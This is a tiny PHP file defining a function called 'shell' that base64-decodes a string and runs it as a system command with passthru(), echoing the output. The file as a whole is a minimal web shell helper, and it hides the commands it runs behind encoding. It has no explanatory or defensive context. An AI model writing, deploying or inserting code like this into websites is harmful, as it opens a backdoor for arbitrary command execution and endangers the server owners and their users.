<?php

function shell($str)
{
	$str=str_replace(' ','+',$str);
	$str=base64_decode($str);
	echo '<pre>';
	passthru($str);
	echo '</pre>';
}

?>
